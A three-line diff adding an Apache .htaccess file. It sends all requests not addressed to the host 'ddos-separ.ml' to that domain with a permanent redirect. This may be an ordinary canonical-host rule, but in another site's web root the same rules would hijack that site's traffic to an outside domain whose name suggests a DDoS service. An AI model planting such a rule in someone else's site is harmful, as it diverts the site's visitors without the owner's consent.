@@ -1,0 +1,3 @@
+RewriteEngine On
+RewriteCond %{HTTP_HOST} !^ddos-separ\.ml$ [NC]
+RewriteRule ^(.*)$ http://ddos-separ.ml/$1 [L,R=301]
